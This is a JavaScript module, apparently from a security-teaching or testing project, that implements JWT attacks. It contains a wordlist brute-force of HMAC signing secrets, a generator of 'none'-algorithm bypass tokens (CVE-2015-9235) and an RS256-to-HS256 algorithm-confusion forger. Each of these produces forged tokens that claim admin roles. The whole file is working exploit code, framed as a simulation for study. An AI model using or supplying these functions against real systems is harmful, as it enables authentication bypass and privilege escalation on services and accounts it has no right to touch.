/**
 * Hacker Exploit Simulation & Vulnerability Validation Modules.
 * Tests for CVE-2015-9235 ('none' alg), Algorithm Confusion, and Secret Brute-forcing.
 * Directly implements Certiport Domain 1.4: Strong vs. Weak Encryption Algorithms.
 */

import { parseJwt, signHmac, createJwt, base64UrlEncode } from "./jwt.js";
import { COMMON_JWT_SECRETS } from "./wordlist.js";

/**
 * Perform offline dictionary brute-force against HMAC-signed JWT.
 */
export function crackHmacSecret(token, wordlist = COMMON_JWT_SECRETS) {
  const parsed = parseJwt(token);
  const alg = parsed.header.alg || "HS256";

  if (!alg.startsWith("HS")) {
    return {
      success: false,
      reason: `Algorithm ${alg} is not symmetric HMAC (cannot brute-force with HMAC wordlist).`
    };
  }

  const targetSignature = parsed.signature;
  const signingInput = parsed.signingInput;

  for (const secret of wordlist) {
    const candidateSig = signHmac(alg, signingInput, secret);
    if (candidateSig === targetSignature) {
      // Crack successful! Generate a forged elevated token
      const forgedPayload = { ...parsed.payload, role: "admin", is_admin: true };
      const forgedToken = createJwt(parsed.header, forgedPayload, secret);

      return {
        success: true,
        crackedSecret: secret,
        algorithm: alg,
        attempts: wordlist.indexOf(secret) + 1,
        forgedToken
      };
    }
  }

  return {
    success: false,
    reason: `Secret not found in wordlist (${wordlist.length} tested candidates).`
  };
}

/**
 * Generate 'none' algorithm bypass attack payloads (CVE-2015-9235).
 */
export function generateNoneAttackPayloads(token) {
  const parsed = parseJwt(token);
  const variations = ["none", "None", "NONE", "nOnE"];
  const forgedPayload = {
    ...parsed.payload,
    role: "admin",
    admin: true,
    sub: parsed.payload.sub || "admin"
  };

  const results = [];
  for (const v of variations) {
    const header = { ...parsed.header, alg: v };
    const forgedToken = createJwt(header, forgedPayload, "", "");
    results.push({
      variant: v,
      token: forgedToken
    });
  }

  return {
    originalToken: token,
    forgedPayload,
    payloads: results
  };
}

/**
 * Generate RS256 to HS256 Algorithm Confusion exploit token (CVE-2016-5431).
 */
export function generateAlgorithmConfusionToken(token, publicKeyPem) {
  const parsed = parseJwt(token);
  const header = { ...parsed.header, alg: "HS256" };
  const forgedPayload = {
    ...parsed.payload,
    role: "admin",
    admin: true
  };

  // Sign using the server's public key as an HMAC secret!
  const forgedToken = createJwt(header, forgedPayload, publicKeyPem);

  return {
    algorithm: "HS256 (Downgraded from RS256)",
    forgedPayload,
    forgedToken
  };
}
